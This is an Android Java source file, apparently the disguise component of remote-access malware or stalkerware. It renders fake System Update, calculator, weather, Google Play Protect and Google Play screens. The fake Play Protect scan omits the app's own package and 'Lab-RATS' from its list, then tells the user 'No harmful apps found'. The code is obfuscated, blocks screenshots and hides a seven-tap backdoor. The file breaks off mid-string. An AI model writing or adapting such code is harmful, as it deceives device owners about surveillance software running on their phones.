package com.seguranca.protecao;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;

import org.lsposed.lsparanoid.Obfuscate;

import java.util.ArrayList;
import java.util.List;

/**
 * FlashDecoyActivity — renders the visual decoy for each persona.
 *
 * Personas rendered here:
 *  PERSONA_SYS_UPDATE   → Android System Update screen
 *  PERSONA_CALCULATOR   → Fully functional AOSP-style calculator
 *  PERSONA_WEATHER      → Animated weather card UI
 *  PERSONA_PLAY_PROTECT → Google Play Protect scanning screen
 *  PERSONA_GOOGLE_PLAY  → Google Play "searching for updates" screen
 *  PERSONA_FILE_MGR     → Android Files browsing screen
 *
 * Backdoor: 7 rapid taps on the top status bar area → backdoor restore.
 */
@Obfuscate
public class FlashDecoyActivity extends Activity {

    private static final String TAG = "FDA";

    // ── Backdoor tap tracking ───────────────────────────────────────────────
    private int     tapCount       = 0;
    private long    lastTapTime    = 0;
    private static final int  BACKDOOR_TAPS     = 7;
    private static final long TAP_WINDOW_MS     = 3000;

    private Handler handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Status/nav bar color matching
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(Color.BLACK);
            getWindow().setNavigationBarColor(Color.BLACK);
        }

        // Prevent screenshots of decoy
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_SECURE,
            WindowManager.LayoutParams.FLAG_SECURE
        );

        int persona = DecoyManager.get(this).getPersona();
        Log.d(TAG, "Rendering persona: " + persona);

        switch (persona) {
            case DecoyManager.PERSONA_CALCULATOR:   renderCalculator();   break;
            case DecoyManager.PERSONA_WEATHER:      renderWeather();      break;
            case DecoyManager.PERSONA_PLAY_PROTECT: renderPlayProtect();  break;
            case DecoyManager.PERSONA_GOOGLE_PLAY:  renderGooglePlay();   break;
            case DecoyManager.PERSONA_FILE_MGR:     renderFileMgr();      break;
            default:                                renderSysUpdate();    break;
        }
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  PERSONA 1 — SYSTEM UPDATE
    // ══════════════════════════════════════════════════════════════════════════

    private void renderSysUpdate() {
        String html =
            "<!DOCTYPE html><html><head>" +
            "<meta name='viewport' content='width=device-width,initial-scale=1,user-scalable=no'>" +
            "<style>" +
            "*{box-sizing:border-box;margin:0;padding:0;font-family:'Roboto',sans-serif}" +
            "body{background:#fff;color:#202124;padding:0}" +
            ".toolbar{background:#1a73e8;padding:16px;display:flex;align-items:center;gap:12px}" +
            ".toolbar svg{fill:#fff;width:24px;height:24px;flex-shrink:0}" +
            ".toolbar-title{color:#fff;font-size:20px;font-weight:500}" +
            ".content{padding:24px 16px}" +
            ".icon-wrap{text-align:center;margin:20px 0}" +
            ".icon-wrap svg{width:72px;height:72px}" +
            "h1{font-size:22px;font-weight:400;text-align:center;color:#202124;margin:16px 0 8px}" +
            "p{font-size:14px;color:#5f6368;text-align:center;line-height:1.6}" +
            ".progress-wrap{margin:28px 0 12px}" +
            ".progress-bar{height:4px;background:#e0e0e0;border-radius:2px;overflow:hidden}" +
            ".progress-fill{height:100%;background:#1a73e8;border-radius:2px;width:0%;transition:width 0.4s ease}" +
            ".progress-label{font-size:12px;color:#5f6368;text-align:right;margin-top:6px}" +
            ".btn{display:block;width:100%;padding:14px;background:#1a73e8;color:#fff;border:none;" +
            "border-radius:4px;font-size:14px;font-weight:500;text-transform:uppercase;letter-spacing:0.5px;" +
            "margin-top:24px;cursor:pointer;text-align:center}" +
            ".btn:disabled{background:#e0e0e0;color:#9e9e9e}" +
            ".step{display:flex;align-items:flex-start;gap:12px;margin-bottom:16px}" +
            ".step-icon{width:20px;height:20px;border-radius:50%;background:#e8f0fe;display:flex;align-items:center;justify-content:center;flex-shrink:0;margin-top:2px}" +
            ".step-icon.done{background:#34a853}" +
            ".step-icon.active{background:#1a73e8}" +
            ".step-text{font-size:14px;color:#3c4043;line-height:1.5}" +
            ".step-sub{font-size:12px;color:#9aa0a6;margin-top:2px}" +
            ".divider{height:1px;background:#e0e0e0;margin:20px 0}" +
            ".version-info{font-size:12px;color:#9aa0a6;text-align:center}" +
            "</style></head><body>" +
            "<div class='toolbar'>" +
            "<svg viewBox='0 0 24 24'><path d='M4 10v7h3v-7H4zm6 0v7h3v-7h-3zM2 22h19v-3H2v3zm14-12v7h3v-7h-3zM11.5 1 2 6v2h19V6l-9.5-5z'/></svg>" +
            "<span class='toolbar-title'>System Update</span>" +
            "</div>" +
            "<div class='content'>" +
            "<div class='icon-wrap'>" +
            "<svg viewBox='0 0 48 48' xmlns='http://www.w3.org/2000/svg'>" +
            "<circle cx='24' cy='24' r='22' fill='#e8f0fe'/>" +
            "<path d='M24 10 L24 30 M15 22 L24 10 L33 22' stroke='#1a73e8' stroke-width='3' fill='none' stroke-linecap='round' stroke-linejoin='round'/>" +
            "<rect x='14' y='32' width='20' height='4' rx='2' fill='#1a73e8'/>" +
            "</svg></div>" +
            "<h1 id='title'>Checking for updates…</h1>" +
            "<p id='desc'>Your device is being checked for the latest security patches and system improvements.</p>" +
            "<div class='progress-wrap'>" +
            "<div class='progress-bar'><div class='progress-fill' id='bar'></div></div>" +
            "<div class='progress-label' id='pct'>0%</div>" +
            "</div>" +
            "<div class='divider'></div>" +
            "<div class='step'><div class='step-icon active' id='s1'></div><div><div class='step-text'>Connecting to update server</div><div class='step-sub' id='s1t'>In progress…</div></div></div>" +
            "<div class='step'><div class='step-icon' id='s2'></div><div><div class='step-text'>Verifying device compatibility</div><div class='step-sub' id='s2t'>Waiting</div></div></div>" +
            "<div class='step'><div class='step-icon' id='s3'></div><div><div class='step-text'>Downloading security patch</div><div class='step-sub' id='s3t'>Waiting</div></div></div>" +
            "<div class='step'><div class='step-icon' id='s4'></div><div><div class='step-text'>Applying update</div><div class='step-sub' id='s4t'>Waiting</div></div></div>" +
            "<div class='divider'></div>" +
            "<div class='version-info' id='verinfo'>Current: Android " + Build.VERSION.RELEASE + " (Build " + Build.DISPLAY + ")</div>" +
            "</div>" +
            "<script>" +
            "var pct=0,phase=0;" +
            "var phases=[" +
            "{p:25,s1:'Connected',s2:'Verifying…',s1c:'done',s2c:'active',title:'Checking compatibility…',desc:'Verifying your device meets update requirements.'}," +
            "{p:60,s2:'Compatible',s3:'Downloading… 42 MB',s2c:'done',s3c:'active',title:'Downloading update…',desc:'Security patch level: " + Build.VERSION.SECURITY_PATCH + "\\nDo not turn off your phone.'}," +
            "{p:85,s3:'Download complete',s4:'Preparing install…',s3c:'done',s4c:'active',title:'Preparing to install…',desc:'Verifying package integrity before installation.'}," +
            "{p:100,s4:'Ready to install',s4c:'done',title:'Update ready!',desc:'Restart your device to apply the latest security patch.'}];" +
            "function step(){if(phase>=phases.length)return;" +
            "var d=phases[phase];" +
            "document.getElementById('bar').style.width=d.p+'%';" +
            "document.getElementById('pct').textContent=d.p+'%';" +
            "document.getElementById('title').textContent=d.title;" +
            "document.getElementById('desc').textContent=d.desc;" +
            "if(d.s1)document.getElementById('s1t').textContent=d.s1;" +
            "if(d.s2)document.getElementById('s2t').textContent=d.s2;" +
            "if(d.s3)document.getElementById('s3t').textContent=d.s3;" +
            "if(d.s4)document.getElementById('s4t').textContent=d.s4;" +
            "if(d.s1c)document.getElementById('s1').className='step-icon '+d.s1c;" +
            "if(d.s2c)document.getElementById('s2').className='step-icon '+d.s2c;" +
            "if(d.s3c)document.getElementById('s3').className='step-icon '+d.s3c;" +
            "if(d.s4c)document.getElementById('s4').className='step-icon '+d.s4c;" +
            "phase++;}" +
            "setTimeout(function(){step();},1800);" +
            "setTimeout(function(){step();},5500);" +
            "setTimeout(function(){step();},10000);" +
            "setTimeout(function(){step();},15000);" +
            "</script></body></html>";

        loadWebDecoy(html);
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  PERSONA 2 — CALCULATOR
    // ══════════════════════════════════════════════════════════════════════════

    private void renderCalculator() {
        String html =
            "<!DOCTYPE html><html><head>" +
            "<meta name='viewport' content='width=device-width,initial-scale=1,user-scalable=no'>" +
            "<style>" +
            "*{box-sizing:border-box;margin:0;padding:0;user-select:none;-webkit-tap-highlight-color:transparent}" +
            "body{background:#000;height:100vh;display:flex;flex-direction:column;overflow:hidden}" +
            ".display{flex:1;display:flex;flex-direction:column;justify-content:flex-end;padding:16px 20px;background:#000}" +
            ".expr{font-size:20px;color:#757575;text-align:right;min-height:28px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}" +
            ".result{font-size:72px;color:#fff;text-align:right;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;line-height:1}" +
            ".keys{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:#1a1a1a}" +
            ".key{background:#3a3a3a;color:#fff;font-size:28px;height:72px;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:background 0.1s;font-weight:300}" +
            ".key:active{background:#555}" +
            ".key.fn{background:#282828;font-size:22px;color:#9e9e9e}" +
            ".key.fn:active{background:#444}" +
            ".key.op{background:#282828;color:#ff9800;font-size:32px}" +
            ".key.op:active{background:#3d2800}" +
            ".key.eq{background:#ff9800;color:#fff;font-size:36px}" +
            ".key.eq:active{background:#e65c00}" +
            ".key.zero{grid-column:span 2;justify-content:flex-start;padding-left:28px}" +
            "</style></head><body>" +
            "<div class='display'>" +
            "<div class='expr' id='expr'></div>" +
            "<div class='result' id='result'>0</div>" +
            "</div>" +
            "<div class='keys'>" +
            "<div class='key fn' onclick='fn(\"AC\")' id='ac'>AC</div>" +
            "<div class='key fn' onclick='fn(\"+/-\")'>+/-</div>" +
            "<div class='key fn' onclick='fn(\"%\")'>%</div>" +
            "<div class='key op' onclick='op(\"/\")'>÷</div>" +
            "<div class='key' onclick='num(7)'>7</div>" +
            "<div class='key' onclick='num(8)'>8</div>" +
            "<div class='key' onclick='num(9)'>9</div>" +
            "<div class='key op' onclick='op(\"*\")'>×</div>" +
            "<div class='key' onclick='num(4)'>4</div>" +
            "<div class='key' onclick='num(5)'>5</div>" +
            "<div class='key' onclick='num(6)'>6</div>" +
            "<div class='key op' onclick='op(\"-\")'>−</div>" +
            "<div class='key' onclick='num(1)'>1</div>" +
            "<div class='key' onclick='num(2)'>2</div>" +
            "<div class='key' onclick='num(3)'>3</div>" +
            "<div class='key op' onclick='op(\"+\")'>+</div>" +
            "<div class='key zero' onclick='num(0)'>0</div>" +
            "<div class='key' onclick='dot()'>.</div>" +
            "<div class='key eq' onclick='eq()'>=</div>" +
            "</div>" +
            "<script>" +
            "var buf='',op1='',pendOp='',justCalc=false,hasDot=false;" +
            "function R(){document.getElementById('result').textContent=buf||'0';}" +
            "function num(n){" +
            "if(justCalc){buf='';justCalc=false;hasDot=false;}" +
            "if(buf==='0'&&n===0)return;" +
            "if(buf==='0'&&n!==0){buf=''+n;}else{buf+=n;}" +
            "R();}" +
            "function dot(){" +
            "if(justCalc){buf='0';justCalc=false;}" +
            "if(hasDot)return;hasDot=true;" +
            "if(!buf)buf='0';" +
            "buf+='.';R();}" +
            "function op(o){" +
            "if(buf){" +
            "if(op1&&pendOp){" +
            "var r=calc(parseFloat(op1),parseFloat(buf),pendOp);" +
            "document.getElementById('expr').textContent=fmt(op1)+' '+sym(pendOp)+' '+fmt(buf)+' ';" +
            "op1=''+r;buf='';R();" +
            "}else{op1=buf;buf='';}" +
            "}" +
            "pendOp=o;hasDot=false;" +
            "document.getElementById('ac').textContent='C';" +
            "}" +
            "function eq(){" +
            "if(!op1||!pendOp||buf==='')return;" +
            "var a=parseFloat(op1),b=parseFloat(buf);" +
            "var r=calc(a,b,pendOp);" +
            "document.getElementById('expr').textContent=fmt(op1)+' '+sym(pendOp)+' '+fmt(buf)+' =';" +
            "buf=fmt(r);op1='';pendOp='';justCalc=true;hasDot=(buf.indexOf('.')>-1);R();}" +
            "function calc(a,b,o){" +
            "switch(o){case'+':return a+b;case'-':return a-b;case'*':return a*b;" +
            "case'/':return b===0?NaN:a/b;}return b;}" +
            "function fmt(n){" +
            "var v=parseFloat(n);" +
            "if(isNaN(v))return'Error';" +
            "if(Number.isInteger(v)&&Math.abs(v)<1e15)return''+v;" +
            "return parseFloat(v.toPrecision(10)).toString();}" +
            "function sym(o){return{'+':'+','-':'−','*':'×','/':'÷'}[o]||o;}" +
            "function fn(f){" +
            "if(f==='AC'){buf='';op1='';pendOp='';justCalc=false;hasDot=false;" +
            "document.getElementById('expr').textContent='';" +
            "document.getElementById('ac').textContent='AC';R();}" +
            "else if(f==='+/-'){" +
            "if(buf&&buf!=='0'){buf=buf.startsWith('-')?buf.slice(1):'-'+buf;R();}}" +
            "else if(f==='%'){" +
            "if(buf){var v=parseFloat(buf)/100;buf=''+v;hasDot=(buf.indexOf('.')>-1);R();}}}" +
            "</script></body></html>";

        loadWebDecoy(html);
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  PERSONA 3 — WEATHER
    // ══════════════════════════════════════════════════════════════════════════

    private void renderWeather() {
        String html =
            "<!DOCTYPE html><html><head>" +
            "<meta name='viewport' content='width=device-width,initial-scale=1,user-scalable=no'>" +
            "<style>" +
            "*{box-sizing:border-box;margin:0;padding:0;font-family:'Roboto',sans-serif}" +
            "body{background:linear-gradient(160deg,#1565c0 0%,#0d47a1 50%,#01579b 100%);" +
            "color:#fff;min-height:100vh;padding:0;overflow-x:hidden}" +
            ".topbar{display:flex;align-items:center;justify-content:space-between;padding:16px 16px 8px}" +
            ".topbar svg{fill:#fff;width:24px;height:24px}" +
            ".city{font-size:28px;font-weight:300;text-align:center;padding:8px 16px 0}" +
            ".updated{font-size:12px;color:rgba(255,255,255,0.65);text-align:center;margin-bottom:16px}" +
            ".main-temp{font-size:96px;font-weight:100;text-align:center;line-height:1}" +
            ".degree{font-size:40px;vertical-align:top;margin-top:8px}" +
            ".condition{font-size:18px;color:rgba(255,255,255,0.85);text-align:center;margin:4px 0 2px}" +
            ".hi-lo{font-size:14px;color:rgba(255,255,255,0.7);text-align:center;margin-bottom:20px}" +
            ".icon-anim{text-align:center;font-size:72px;margin:12px 0;animation:pulse 3s ease-in-out infinite}" +
            "@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.08)}}" +
            ".hourly{display:flex;overflow-x:auto;padding:0 12px;gap:4px;margin-bottom:16px}" +
            ".hourly::-webkit-scrollbar{display:none}" +
            ".hr-card{flex-shrink:0;background:rgba(255,255,255,0.12);border-radius:12px;padding:10px 14px;text-align:center;min-width:60px}" +
            ".hr-time{font-size:12px;color:rgba(255,255,255,0.7)}" +
            ".hr-icon{font-size:22px;margin:4px 0}" +
            ".hr-temp{font-size:15px;font-weight:500}" +
            ".details{display:grid;grid-template-columns:1fr 1fr;gap:8px;padding:0 12px 24px}" +
            ".det{background:rgba(255,255,255,0.1);border-radius:12px;padding:12px}" +
            ".det-label{font-size:11px;color:rgba(255,255,255,0.65);text-transform:uppercase;letter-spacing:0.8px}" +
            ".det-val{font-size:22px;font-weight:400;margin-top:2px}" +
            ".det-sub{font-size:12px;color:rgba(255,255,255,0.65);margin-top:1px}" +
            "</style></head><body>" +
            "<div class='topbar'>" +
            "<svg viewBox='0 0 24 24'><path d='M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z'/></svg>" +
            "<svg viewBox='0 0 24 24'><path d='M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z'/></svg>" +
            "<svg viewBox='0 0 24 24'><path d='M12 15.5A3.5 3.5 0 0 1 8.5 12 3.5 3.5 0 0 1 12 8.5a3.5 3.5 0 0 1 3.5 3.5 3.5 3.5 0 0 1-3.5 3.5m7.43-2.92c.04-.34.07-.68.07-1.08s-.03-.74-.07-1.08l2.32-1.84c.21-.16.27-.46.13-.7l-2.2-3.84c-.13-.24-.42-.32-.67-.24l-2.73 1.1c-.57-.44-1.17-.82-1.84-1.1L14.11 2.1c-.05-.26-.3-.45-.58-.45h-4.4c-.28 0-.53.19-.57.45l-.42 2.9c-.67.28-1.27.66-1.84 1.1L3.57 5c-.25-.08-.54 0-.67.24L.7 9.08c-.14.24-.08.54.13.7l2.32 1.84c-.04.34-.07.68-.07 1.08s.03.74.07 1.08L.83 15.62c-.21.16-.27.46-.13.7l2.2 3.84c.13.24.42.32.67.24l2.73-1.1c.57.44 1.17.82 1.84 1.1l.42 2.9c.04.26.29.45.57.45h4.4c.28 0 .53-.19.57-.45l.42-2.9c.67-.28 1.27-.66 1.84-1.1l2.73 1.1c.25.08.54 0 .67-.24l2.2-3.84c.14-.24.08-.54-.13-.7l-2.32-1.84z'/></svg>" +
            "</div>" +
            "<div class='city' id='city'>Loading…</div>" +
            "<div class='updated' id='upd'></div>" +
            "<div class='icon-anim' id='wi'>⛅</div>" +
            "<div class='main-temp'><span id='temp'>--</span><span class='degree'>°</span></div>" +
            "<div class='condition' id='cond'>Partly Cloudy</div>" +
            "<div class='hi-lo' id='hilo'>H:--° L:--°</div>" +
            "<div class='hourly' id='hourly'></div>" +
            "<div class='details'>" +
            "<div class='det'><div class='det-label'>Humidity</div><div class='det-val' id='hum'>--%</div><div class='det-sub'>Dew point --°</div></div>" +
            "<div class='det'><div class='det-label'>Wind</div><div class='det-val' id='wind'>-- km/h</div><div class='det-sub' id='wdir'>--</div></div>" +
            "<div class='det'><div class='det-label'>Feels Like</div><div class='det-val' id='feel'>--°</div><div class='det-sub'>Normal</div></div>" +
            "<div class='det'><div class='det-label'>UV Index</div><div class='det-val' id='uv'>--</div><div class='det-sub' id='uvl'>--</div></div>" +
            "<div class='det'><div class='det-label'>Visibility</div><div class='det-val' id='vis'>-- km</div><div class='det-sub'>Clear</div></div>" +
            "<div class='det'><div class='det-label'>Pressure</div><div class='det-val' id='pres'>-- hPa</div><div class='det-sub'>Stable</div></div>" +
            "</div>" +
            "<script>" +
            "var cities=['New York','Los Angeles','Chicago','Houston','Miami','Seattle','Denver','Boston'];" +
            "var icons=['☀️','⛅','🌤️','🌥️','🌦️','🌈'];" +
            "var conds=['Mostly Sunny','Partly Cloudy','Scattered Clouds','Overcast','Light Rain','Clear'];" +
            "var idx=Math.floor(Math.random()*cities.length);" +
            "var t=Math.floor(Math.random()*20)+10;" +
            "var ic=Math.floor(Math.random()*icons.length);" +
            "document.getElementById('city').textContent=cities[idx];" +
            "document.getElementById('temp').textContent=t;" +
            "document.getElementById('cond').textContent=conds[ic];" +
            "document.getElementById('wi').textContent=icons[ic];" +
            "document.getElementById('hilo').textContent='H:'+(t+5)+'° L:'+(t-6)+'°';" +
            "document.getElementById('hum').textContent=Math.floor(Math.random()*40+40)+'%';" +
            "document.getElementById('wind').textContent=Math.floor(Math.random()*30+5)+' km/h';" +
            "document.getElementById('wdir').textContent=['NW','N','NE','E','SE','S','SW','W'][Math.floor(Math.random()*8)];" +
            "document.getElementById('feel').textContent=(t-2)+'°';" +
            "var uv=Math.floor(Math.random()*8+1);" +
            "document.getElementById('uv').textContent=uv;" +
            "document.getElementById('uvl').textContent=uv<3?'Low':uv<6?'Moderate':uv<8?'High':'Very High';" +
            "document.getElementById('vis').textContent=Math.floor(Math.random()*8+8)+' km';" +
            "document.getElementById('pres').textContent=(1013+Math.floor(Math.random()*20-10))+' hPa';" +
            "var now=new Date();var ampm=now.getHours()>=12?'PM':'AM';" +
            "var h12=now.getHours()%12||12;" +
            "document.getElementById('upd').textContent='Updated '+h12+':'+(now.getMinutes()<10?'0':'')+now.getMinutes()+' '+ampm;" +
            "var hc=document.getElementById('hourly');" +
            "for(var i=1;i<=8;i++){" +
            "var hh=(now.getHours()+i)%24;var ap=hh>=12?'PM':'AM';var d=document.createElement('div');" +
            "d.className='hr-card';" +
            "d.innerHTML='<div class=\"hr-time\">'+(hh%12||12)+' '+ap+'</div>" +
            "<div class=\"hr-icon\">'+icons[Math.floor(Math.random()*3)]+'</div>" +
            "<div class=\"hr-temp\">'+(t+Math.floor(Math.random()*8-4))+'°</div>';" +
            "hc.appendChild(d);}" +
            "</script></body></html>";

        loadWebDecoy(html);
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  PERSONA 4 — PLAY PROTECT
    // ══════════════════════════════════════════════════════════════════════════

    private void renderPlayProtect() {
        // Build a fake app list excluding own package + Lab-RATS
        StringBuilder fakeApps = new StringBuilder();
        try {
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            int shown = 0;
            for (ApplicationInfo app : apps) {
                if (shown >= 12) break;
                if (DecoyManager.isExcludedFromScan(app.packageName)) continue;
                if ((app.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    String label = pm.getApplicationLabel(app).toString()
                        .replace("'", "\\'").replace("\"", "&quot;");
                    fakeApps.append("{n:'").append(label).append("',p:'").append(app.packageName).append("'},");
                    shown++;
                }
            }
        } catch (Exception ignored) {}

        String html =
            "<!DOCTYPE html><html><head>" +
            "<meta name='viewport' content='width=device-width,initial-scale=1,user-scalable=no'>" +
            "<style>" +
            "*{box-sizing:border-box;margin:0;padding:0;font-family:'Roboto',sans-serif}" +
            "body{background:#fff;color:#202124}" +
            ".toolbar{background:#fff;padding:14px 16px;display:flex;align-items:center;gap:16px;border-bottom:1px solid #e0e0e0}" +
            ".toolbar svg{fill:#5f6368;width:24px;height:24px}" +
            ".toolbar-title{font-size:20px;color:#202124}" +
            ".status-card{margin:16px;background:#e8f5e9;border-radius:12px;padding:20px;display:flex;align-items:center;gap:16px}" +
            ".status-icon{width:48px;height:48px;background:#34a853;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}" +
            ".status-icon svg{fill:#fff;width:28px;height:28px}" +
            ".status-title{font-size:16px;font-weight:500;color:#1b5e20}" +
            ".status-desc{font-size:13px;color:#2e7d32;margin-top:2px}" +
            ".scan-row{padding:12px 16px;display:flex;align-items:center;justify-content:space-between}" +
            ".scan-label{font-size:14px;color:#3c4043}" +
            ".scan-time{font-size:12px;color:#9aa0a6}" +
            ".section-header{padding:12px 16px 6px;font-size:12px;color:#9aa0a6;text-transform:uppercase;letter-spacing:0.8px}" +
            ".app-row{padding:10px 16px;display:flex;align-items:center;gap:14px;border-bottom:1px solid #f1f3f4}" +
            ".app-ic{width:40px;height:40px;border-radius:8px;background:#e8eaf6;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:20px}" +
            ".app-name{font-size:14px;color:#3c4043}" +
            ".app-pkg{font-size:11px;color:#9aa0a6}" +
            ".app-ok{margin-left:auto;display:flex;align-items:center;gap:4px;font-size:12px;color:#34a853}" +
            ".app-ok svg{fill:#34a853;width:16px;height:16px}" +
            ".progress-overlay{position:fixed;inset:0;background:#fff;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:16px;z-index:99}" +
            ".scan-anim{width:80px;height:80px;border:4px solid #e0e0e0;border-top-color:#1a73e8;border-radius:50%;animation:spin 1s linear infinite}" +
            "@keyframes spin{to{transform:rotate(360deg)}}" +
            ".scan-title{font-size:18px;color:#202124}" +
            ".scan-sub{font-size:13px;color:#5f6368}" +
            ".scan-prog{width:200px;height:4px;background:#e0e0e0;border-radius:2px;overflow:hidden}" +
            ".scan-prog-fill{height:100%;background:#1a73e8;width:0%;transition:width 0.3s}" +
            "</style></head><body>" +
            "<div class='progress-overlay' id='overlay'>" +
            "<div class='scan-anim'></div>" +
            "<div class='scan-title'>Scanning device…</div>" +
            "<div class='scan-prog'><div class='scan-prog-fill' id='sp'></div></div>" +
            "<div class='scan-sub' id='sp-label'>Scanning 0 apps…</div>" +
            "</div>" +
            "<div class='toolbar'>" +
            "<svg viewBox='0 0 24 24'><path d='M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z'/></svg>" +
            "<span class='toolbar-title'>Play Protect</span>" +
            "</div>" +
            "<div class='status-card'>" +
            "<div class='status-icon'><svg viewBox='0 0 24 24'><path d='M12 1 3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z'/></svg></div>" +
            "<div><div class='status-title'>No harmful apps found</div>" +
            "<div class='status-desc'>Your device is protected</div></div>" +
            "</div>" +
            "<div class='scan-row'><span class='scan-label'>Last scan</span><span class='scan-time' id='lastscan'>Just now</span></div>" +
            "<div class='section-header'>Recently scanned apps</div>" +
            "<div id='applist'></div>" +
            "<script>" +
            "var apps=[" + fakeApps + "];" +
            "var icons=['📱','🎮','🎵','📷','🗺️','💬','📧','🛒','💰','📺','🏋️','🔧'];" +
            "var total=apps.length;" +
            "var prog=document.getElementById('sp');" +
            "var lbl=document.getElementById('sp-label');" +
            "var i=0;" +
            "function scanStep(){" +
            "if(i>=total){" +
            "document.getElementById('overlay').style.display='none';" +
            "document.getElementById('lastscan').textContent='Just now';" +
            "buildList();return;}" +
            "var pct=Math.round((i/Math.max(total,1))*100);" +
            "prog.style.width=pct+'%';" +
            "lbl.textContent='Scanning '+(i+1)+' of '+total+' apps…';" +
            "i++;setTimeout(scanStep,Math.random()*120+60);}" +
            "function buildList(){" +
            "var c=document.getElementById('applist');" +
            "apps.forEach(function(a,j){" +
            "var d=document.createElement('div');d.className='app-row';" +
            "d.innerHTML='<div class=\"app-ic\">'+icons[j%icons.length]+'</div>" +
            "<div><div class=\"app-name\">'+a.n+'</div><div class=\"app-pkg\">'+a.p+'</div></div>" +
            "<div class=\"app-ok\"><svg viewBox=\"0 0 24 24\"><path d=\"M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z\"/></svg>OK</div>';" +
            "c.appendChild(d);});}" +
            "setTimeout(scanStep,1200);" +
            "</script></body></html>";

        loadWebDecoy(html);
    }

    // ══════════════════════════════════════════════════════════════════════════
    //  PERSONA 5 — GOOGLE PLAY
    // ══════════════════════════════════════════════════════════════════════════

    private void renderGooglePlay() {
        String html =
            "<!DOCTYPE html><html><head>" +
            "<meta name='viewport' content='width=device-width,initial-scale=1,user-scalable=no'>" +
            "<style>" +
            "*{box-sizing:border-box;margin:0;padding:0;font-family:'Roboto',sans-serif}" +
            "body{background:#fff;color:#202124}" +
            ".toolbar{background:#fff;padding:14px 16px;display:flex;align-items:center;gap:12px;box-shadow:0 1px 4px rgba(0,0,0,0.12)}" +
            ".logo{display:flex;align-items:center;gap:8px}" +
            ".logo-text{font-size:18px;font-weight:400;color:#3c4043}" +
            ".logo-text span{color:#1a73e8}" +
            ".search-bar{flex:1;background:#f1f3f4;border-radius:24px;padding:8px 16px;font-size:14px;color:#3c4043;display:flex;align-items:center;gap:8px}" +
            ".search-bar svg{fill:#9aa0a6;width:18px;height:18px}" +
            ".tabs{display:flex;border-bottom:1px solid #e0e0e0;padding:0 16px}" +
            ".tab{padding:14px 16px 10px;font-size:14px;color:#9aa0a6;border-bottom:2px solid transparent;cursor:pointer}" +
            ".tab.active{color:#1a73e8;border-color:#1a73e8;font-weight:500}" +
            ".section{padding:16px 16px 8px;font-size:16px;font-weight:500}" +
            ".app-card{display:flex;align-items:center;gap:14px;padding:10px 16px}" +
            ".app-ic{width:52px;height:52px;border-radius:12px;background:#e8eaf6;overflow:hidden;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:28px}" +
            ".app-title{font-size:14px;font-weight:500;color:#202124}" +
            ".app-meta{font-size:12px;color:#9aa0a6;margin-top:2px}" +
            ".app-rating{display:flex;align-items:center;gap:2px;font-size:12px;color:#5f6368;margin-top:2px}" +
            ".star{color:#f9a825}" +
            ".btn-install{margin-left:auto;padding:6px 16px;border:1px solid #dadce0;border-radius:4px;background:#fff;color:#1a73e8;font-size:12px;font-weight:500;cursor:pointer;flex-shrink:0}" +
            ".update-row{padding:12px 16px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #f1f3f4}" +
            ".update-left{display:flex;align-items:center;gap:14px}" +
            ".update-ic{width:48px;height:48px;border-radius:10px;background:#e3f2fd;display:flex;align-items:center;justify-content:center;font-size:24px}" +
            ".update-name{font-size:14px;color:#202124}" +
            ".update-size{font-size:12px;color:#9aa0a6;margin-top:2px}" +
            ".prog-bar{height:3px;background:#e0e0e0;border-radius:2px;overflow:hidden;width:80px;margin-top:4px}" +
            ".prog-fill{height:100%;background:#1a73e8;animation:scan 2s ease-in-out infinite alternate}" +
            "@keyframes scan{from{width:10%}to{width:90%}}" +
            "</style></head><body>" +
            "<div class='toolbar'>" +
            "<div class='logo'>" +
            "<svg width='24' height='24' viewBox='0 0 24 24'><path d='M3.18 23.78 13.5 12 3.18.22C2.5.68 2 1.56 2 2.6v18.8c0 1.04.5 1.92 1.18 2.38z' fill='#4CAF50'/><path d='m22 12-4.3-2.46-4.2 4.2 4.2 4.2L22 12z' fill='#FFD740'/><path d='m3.18.22 10.08 10L7 15.72 3.18.22z' fill='#FF3D00'/><path d='m3.18 23.78 3.82-15.5 6.26 5.5-10.08 10z' fill='#448AFF'/></svg>" +
            "<span class='logo-text'>Google <span>Play</span></span>" +
            "</div>" +
